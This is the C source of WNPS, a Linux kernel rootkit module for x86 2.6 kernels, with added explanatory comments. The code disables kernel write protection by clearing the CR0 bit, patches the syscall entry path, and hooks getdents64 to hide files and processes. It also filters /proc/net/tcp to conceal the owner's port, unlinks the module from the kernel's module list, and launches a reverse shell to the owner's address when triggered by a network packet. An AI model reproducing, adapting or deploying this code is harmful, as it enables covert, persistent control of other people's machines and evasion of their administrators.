/*
 * WNPS V 0.26 beta2 *Wnps is not poc shell*
 *
 * (C) 2007 wzt    http://www.xsec.org
 *
 * Linux rootkit for x86 2.6.x kernel
 *
 */

#ifndef __KERNEL__
#define __KERNEL__
#endif

#ifndef MODULE
#define MODULE
#endif

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/kobject.h>
#include <linux/ip.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/list.h>
#include <linux/ptrace.h>
#include <linux/spinlock.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>
#include <linux/timer.h>
#include <linux/jiffies.h>
#include <net/tcp.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"
#include "hook.h"
#include "syscalls.h"
#include "host.h"

static inline my_syscall0(pid_t, fork);

asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t nbytes);
//asmlinkage ssize_t (*orig_write)(int fd,void *buf,size_t count);
int (*old_tcp4_seq_show)(struct seq_file *,void *);

asmlinkage long Sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage ssize_t Sys_read(int fd, void *buf, size_t nbytes);
asmlinkage ssize_t Sys_write(int fd,void *buf,size_t count);
asmlinkage long Sys_chdir(const char __user *filename);
asmlinkage int Sys_kill(pid_t pid,int sig);
asmlinkage long Sys_ptrace(long request,long pid,long addr,long data);

/*
static void disable_page_protection(void) {

    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value));
    if (value & 0x00010000) {
            value &= ~0x00010000;
            asm volatile("mov %0,%%cr0": : "r" (value));
    }
}

static void enable_page_protection(void) {

    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value));
    if (!(value & 0x00010000)) {
            value |= 0x00010000;
            asm volatile("mov %0,%%cr0": : "r" (value));
    }
}

*/
unsigned orig_cr0;
unsigned clear_return_cr0(void)
{
    unsigned cr0 = 0;
    unsigned ret;
    asm volatile ("movl %%cr0, %%eax"
    :"=a"(cr0)
    );
    ret = cr0;
    cr0 &= 0xfffeffff;
    asm volatile ("movl %%eax, %%cr0"
    :
    :"a"(cr0)
    );
    return ret;
}

/*
void set_addr_rw(unsigned long addr) {

    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;

}

void set_addr_ro(unsigned long addr) {

    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;

}
*/

void setback_cr0(unsigned val)
{
    asm volatile ("movl %%eax, %%cr0"
    :
    :"a"(val)
    );
}

/*
 * function in shell.c
 */
extern unsigned int hook_func(unsigned int hooknum,
                struct sk_buff **skb,
                const struct net_device *in,
                const struct net_device *out,
                int (*okfn)(struct sk_buff *));

extern int netfilter_test_init(void);
extern void netfilter_test_exit(void);

extern int kshell(int ip,int port);
extern __u32 wnps_in_aton(const char *str);
extern struct nf_hook_ops nfho;

extern unsigned long myowner_port;
extern unsigned long myowner_ip;
extern unsigned int wztshell;
extern char connect_ip[20];

/*
 * function in klogger.c
 */
extern void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count);
extern void (*old_receive_buf)(struct tty_struct *,const unsigned char *,char *,int);

int hook_init(void);

static char read_buf[BUFF];

unsigned long sysenter;

//static struct timer_list my_timer;

void new_idt(void)
{
        ASMIDType
                (
                 "cmp %0, %%eax      \n"
                 "jae syscallmala        \n"
                 "jmp hook               \n"

                 "syscallmala:           \n"
                 "jmp dire_exit          \n"

                 : : "i" (NR_syscalls)
                );
}

void set_idt_handler(void *system_call)
{
        printk("[+] in set_idt_handler\n");
        unsigned char *p;
        unsigned long *p2;

        p = (unsigned char *) system_call;
        while (!((*p == 0x0f) && (*(p+1) == 0x83)))
                p++;
        printk("[+] 1 p=0x%8x\n",p);
        p -= 5;
        *p++ = 0x68;
        
        p2 = (unsigned long *) p;
        *p2++ = (unsigned long) ((void *) new_idt);
        printk("[+] 2\n");
        p = (unsigned char *) p2;
        *p = 0xc3;

        while (!((*p == 0x0f) && (*(p+1) == 0x82)))
                p++;
        p -= 5;

        printk("[+] 3\n");
        *p++ = 0x68;
        p2 = (unsigned long *) p;
        printk("[+] 4\n");
        *p2++ = (unsigned long) ((void *) new_idt);

        p = (unsigned char *) p2;
        printk("[+] 5\n");
        *p = 0xc3;
}

void set_sysenter_handler(void *sysenter)
{
        printk("[+] in set_sysenter_handler\n");
        
        unsigned char *p;
        unsigned long *p2;

        p = (unsigned char *) sysenter;

        while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
                p++;

        while (!((*p == 0x0f) && (*(p+1) == 0x83)))
                p--;
        p -= 5;
        printk("[+] do nothing here -1: %x\n",*p);
        *p++ = 0x68;
        //*p++ = 0x90;
        printk("[+] %x\n",*(p-1));

        p2 = (unsigned long *) p;
        printk("[+] do nothing here -2: %x\n",*p);
        printk("[+] idt handler hooked @0x%8x\n",p2);
        *p2++  = (unsigned long) ((void *) new_idt);
        printk("[+] idt handler hooked to @0x%8x\n",(p2-1));
        //printk("[+] %x\n",*(p-4));
        //printk("[+] %x\n",*(p-3));
        //printk("[+] %x\n",*(p-2));
        //printk("[+] %x\n",*(p-1));

        p = (unsigned char *) p2;

        printk("[+] do nothing here -3: %x\n",*(p-1));
        *p = 0xc3;
        return;
}

void hook(void)
{
        register int eax asm("eax");

        switch(eax)
        {
                case __NR_getdents64:
                        CallHookedSyscall(Sys_getdents64);
                        break;
                case __NR_read:
                        CallHookedSyscall(Sys_read);
                        break;
                        /*
                           case __NR_write:
                           CallHookedSyscall(Sys_write);
                           break;
                         */
                default:
                        JmPushRet(dire_call);
                        break;
        }

        JmPushRet( after_call );
}

/**
 * read_kallsyms - find sysenter address in /proc/kallsyms.
 *
 * success return the sysenter address,failed return 0.
 */
int read_kallsyms(void)
{
        mm_segment_t old_fs;
        ssize_t bytes;
        struct file *file = NULL;
        char *p,temp[20];
        int i = 0;
        file = filp_open(PROC_HOME,O_RDONLY | O_APPEND | O_CREAT, 0644);
        if (!file){
                printk("[+] error occured while opening file %s, exiting...\n", PROC_HOME);
                return -1;
        }
        if (!file->f_op->read){
              printk("[+] no read op for %s\n",PROC_HOME);
                return -1;
        }
        //CHR http://www.mail-archive.com/kernelnewbies@nl.linux.org/msg01233.html
        //CHR get memory space in kernel for 'file' - PROC_HOME
        old_fs = get_fs(); //CHR get current fs and save it
        //set_fs(get_ds()); //CHR set current fs as kernel fs
        set_fs(KERNEL_DS);
        while((bytes = file->f_op->read(file,read_buf,BUFF,&file->f_pos))) {
                //CHR find the string "sysenter_entry"
                //printk("[+] read in %s\n",read_buf);
                if (( p = strstr(read_buf,SYSENTER_ENTRY)) != NULL) {
                        while (*p--)
                                if (*p == '\n')
                                        break;

                        while (*p++ != ' ') {
                                temp[i++] = *p;
                        }
                        temp[--i] = '\0';
                        sysenter = simple_strtoul(temp,NULL,16);
#if DEBUG == 1
                        printk("[+] sysenter=0x%8x\n",sysenter);
#endif
                        break;
                }
        }
        set_fs(old_fs);

        filp_close(file,NULL);

        return 0;
}

//CHR find sysenter address
//CHR int 80h is a stale style for invoking system calls, and has been replaced by SYSENTER on x86 platforms
//CHR http://stackoverflow.com/questions/9136028/why-int80h-instead-of-sysenter-is-used-to-invoke-system-calls
//CHR x86/vdso/vdso32-setup.c - choose between int80 and sysenter according to machine config
void *get_sysenter_entry(void)
{
        void *psysenter_entry = NULL;
        unsigned long v2;
        //CHR cpu_has_sep
        //CHR #define X86_FEATURE_SEP         (0*32+11) /* SYSENTER/SYSEXIT */
        if (boot_cpu_has(X86_FEATURE_SEP)){
                //CHR Loads the contents of a model specific register (MSR) specified in the ECX register into registers EDX:EAX.
                //CHR The rdmsr function arguments are the msr number, a pointer to the low 32 bit word, and a pointer to the high 32 bit word.
                printk("[+] cpu has X86_FEATURE_SEP...\n");
                rdmsr(MSR_IA32_SYSENTER_EIP, psysenter_entry, v2);
        }
        else {
#if DEBUG == 1
                printk("[+] search sysenter_entry...\n");
#endif
                read_kallsyms();
                if (sysenter == 0) {
#if DEBUG == 1
                        printk("[-] Wnps installed failed.\n");
#endif
                } 
                return ((void *) sysenter);
        }

        return(psysenter_entry);
}

/**
 * locate the sys_call_table address.
 */
void *get_sct_addr(unsigned int system_call)
{
        unsigned char *p;
        unsigned long s_c_t;

        p = (unsigned char *) system_call;
        //CHR http://pact518.hit.edu.cn:3000/attachments/download/rootkit
        /*CHR The function system_call makes a direct access to sys_call_table[] (arch/i386/kernel/entry.S:240)
          call *sys_call_table(,%eax,4)
          In x86 machine code, this translates to:
          0xff 0x14 0x85 <addr4> <addr3> <addr2> <addr1>
          Where the 4 'addr' bytes form the address of sys_call_table[]
         */
        while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
                p++;
        //CHR call
        dire_call = (unsigned long) p;
        printk("[+] dire_call@0x%8x\n",p);

        p += 3;
        //CHR <addr4> <addr3> <addr2> <addr1>
        s_c_t = *((unsigned long *) p);
        printk("[+] sct@0x%8x\n",p);

        p += 4;
        //CHR sth after call *sys_call_table(,%eax,4)
        after_call = (unsigned long) p;
        printk("[+] after_call@0x%8x\n",p);

        while (*p != 0xfa)     /* CLI (Clear Interrupts) */
                p++;

        //CHR the exit codes after CLI
        dire_exit = (unsigned long) p;
        printk("[+] dire_exit@0x%8x\n",p);

        //CHR return sys_call_table add
        return((void *) s_c_t);
}

asmlinkage long Sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
        struct linux_dirent64 *td1, *td2;
        long ret, tmp;
        unsigned long hpid, nwarm;
        short int hide_process, hide_file;

        /* first we get the orig information */
        ret = (*orig_getdents64) (fd, dirp, count);
        if (!ret)
                return ret;

        /* get some space in kernel */
        td2 = (struct linux_dirent64 *) kmalloc(ret, GFP_KERNEL);
        if (!td2)
                return ret;

        /* copy the dirp struct to kernel space */
        __copy_from_user(td2, dirp, ret);

        td1 = td2, tmp = ret;
        while (tmp > 0) {
                tmp -= td1->d_reclen;
                hide_file = 1;
                hide_process = 0;
                hpid = 0;
                hpid = simple_strtoul(td1->d_name, NULL, 10);

                /* If we got a file like digital,it may be a task in the /proc.
                   So check the task with the task pid.
                 */
                if (hpid != 0) {
                        struct task_struct *htask = current;
                        do  {
                                if(htask->pid == hpid)
                                        break;
                                else
                                        htask = next_task(htask);
                        } while (htask != current);

                        /* we get the task which will be hide */
                        if ( ((htask->pid == hpid) && (strstr(htask->comm, HIDE_TASK) != NULL)))
                                hide_process = 1;
                }

                if ((hide_process) || (strstr(td1->d_name, HIDE_FILE) != NULL)) {
                        ret -= td1->d_reclen;
                        hide_file = 0;
                        /* we cover the task information */
                        if (tmp)
                                memmove(td1, (char *) td1 + td1->d_reclen, tmp);
                }

                /* we hide the file */
                if ((tmp) && (hide_file))
                        td1 = (struct linux_dirent64 *) ((char *) td1 + td1->d_reclen);

        }

        nwarm = __copy_to_user((void *) dirp, (void *) td2, ret);
        kfree(td2);

        return ret;
}

asmlinkage ssize_t Sys_read(int fd, void *buf, size_t nbytes)
{
        ssize_t ret;

        /* we will start a shell */
        if (wztshell == 1) {
#if DEBUG == 1
                printk(KERN_ALERT "[+] got my owner's packet.\n");
#endif
                wztshell = 0;
                if (!fork())
                        kshell(myowner_ip,myowner_port);
        }

        ret = orig_read(fd,buf,nbytes);

        return ret;
}
/*
   asmlinkage ssize_t Sys_write(int fd,void *buf,size_t count)
   {
   char *replace =  "                       ";
   char *tmp_buf,*p;

   tmp_buf = (char *)kmalloc(READ_NUM,GFP_KERNEL);
   if (tmp_buf == NULL)
   return orig_write(fd,buf,count);

   copy_from_user(tmp_buf,buf,READ_NUM - 1);

   if (connect_ip[0] != 0 || connect_ip[0] != '\0') {
   if ((p = strstr(tmp_buf,connect_ip)) != NULL) {
//   spin_lock(&wnps_lock);
strncpy(p,replace,strlen(replace));
//   spin_unlock(&wnps_lock);
copy_to_user((void *)buf,(void *)tmp_buf,READ_NUM);
kfree(tmp_buf);
return count;
}
}

kfree(tmp_buf);

return orig_write(fd,buf,count);
}
 */

char *strnstr(const char *haystack,const char *needle,size_t n)
{
        //CHR find hidden port
        char *s = strstr(haystack,needle);

        if (s == NULL)
                return NULL;
        if (s - haystack + strlen(needle) <= n)
                return s;
        else
                return NULL;
}

//CHR http://www.tldp.org/LDP/lkmpg/2.6/html/x861.html
//CHR http://lwn.net/Articles/22355/
//CHR http://www.ibm.com/developerworks/cn/linux/l-kerns-usrs2/
//CHR seq_file interface provids data from dirver to user space
//CHR this function will be call multiple times to get the data
//CHR and each time the hidden port info will be extracted to not return
int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
{
        int retval=old_tcp4_seq_show(seq, v);

        char port[12];

        sprintf(port,"%04X",ntohs(myowner_port));

        /* CHR
           16 struct seq_file {
           17         char *buf;
           18         size_t size;
           19         size_t from;
           20         size_t count;
           21         loff_t index;
           22         loff_t read_pos;
           23         u64 version;
           24         struct mutex lock;
           25         const struct seq_operations *op;
           26         void *private;
           27 };
           CHR */

        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
                //CHR only pass out part of returned and hidden the port
                //CHR believe TMPSZ is the size of one record in /proc/net/tcp
                seq->count -= TMPSZ;

        return retval;   
}

int wnps_init(void)
{
        struct descriptor_idt *pIdt80; //CHR local define
        struct module *m = &__this_module;
        //CHR include/net/tcp.h
        /*CHR 01424 struct tcp_seq_afinfo {
          01425         char                            *name;
          01426         sa_family_t                     family;
          01427         const struct file_operations    *seq_fops;
          01428         struct seq_operations           seq_ops;
          01429 };
         */
        struct tcp_seq_afinfo *my_afinfo = NULL;
        //http://www.linuxquestions.org/questions/linux-kernel-70/2-6-24-proc_net-disappeared-617597/
        //CHR for /proc/net
        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;

        //CHR clean current node
        if (m->init == wnps_init)
                list_del(&m->list);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,11)
        kobject_put(&m->mkobj.kobj);
#elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
        kobject_put(&m->mkobj->kobj);
#endif


    /* CHR
        need to find:
        1. int80 sys call address
        2. sys call table address
        3. sysenter address
    */
        //CHR SIDT: "Store Interrupt Descriptor Table Register" 
        //CHR read the system interrupt register
        __asm__ volatile ("sidt %0": "=m" (idt48));

        //CHR get int 0x80h - invoke system calls
        //CHR http://www.linfo.org/int_0x80.html
        pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);
        //CHR the 'int 0x80h' service routing
        system_call_addr = (pIdt80->offset_high << 16 | pIdt80->offset_low);

#if DEBUG == 1
        printk(KERN_ALERT "[+] system_call addr : 0x%8x\n",system_call_addr);
#endif
        //CHR find the system call table address from the INT80 inturrpt service routing table
        sys_call_table_addr = get_sct_addr(system_call_addr);

#if DEBUG == 1
        printk(KERN_ALERT "[+] sys_call_table addr : 0x%8x\n",(unsigned int)sys_call_table_addr);
#endif

        sys_call_table = (void **)sys_call_table_addr;
        //CHR get sysenter which is a alternative of int80, i.e.: pIdt80 here
        sysenter_entry = get_sysenter_entry();

        wztshell = 0;

        atomic_set(&read_activo,0);

        orig_cr0 = clear_return_cr0();

        //CHR find system call of read and getdents64
        orig_read = sys_call_table[__NR_read]; //CHR #define __NR_read 3
        // orig_write = sys_call_table[__NR_write];
        orig_getdents64 = sys_call_table[__NR_getdents64]; //CHR #define __NR_getdents64  220

        printk("[+] set new idt and system call handler address\n");
        
        //set_idt_handler((void *)system_call_addr);
        //set_sysenter_handler(sysenter_entry);
        set_sysenter_handler((void *)system_call_addr);
        
        //CHR find file /proc/net/tcp
        while (strcmp(my_dir_entry->name, "tcp"))
                my_dir_entry = my_dir_entry->next;
        //CHR http://www.cs.ucr.edu/~kishore/cs153_s08/lab2/proc-dir-entry-notes.txt
        //CHR my_dir_entry is proc_dir_entry 
        //CHR data: Used to store extra data. Proc uses it to store the target path in case of a link.
        //CHR hook /proc/net/tcp's show function
        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
        {
                //http://kerneltrap.org/mailarchive/linux-netdev/2008/4/8/1373694
                //CHR http://debug-sai.blogbus.com/logs/50940768.html
                //CHR seq_ops.show is dedicated to /proc/net/tcp
                //CHR it prints data in /proc/net/tcp
                //CHR e.g.: cat /proc/net/tcp, will call seq_ops.show
                old_tcp4_seq_show = my_afinfo->seq_ops.show;
                my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
        }

        netfilter_test_init();

#if DEBUG == 1       
        printk(KERN_ALERT "[+] Wnps installed successfully!\n");
#endif
        setback_cr0(orig_cr0);
        return 0;
}

void wnps_exit(void)
{
        /* 
         * We do nothing here!
         */
}

module_init(wnps_init);
module_exit(wnps_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wzt");

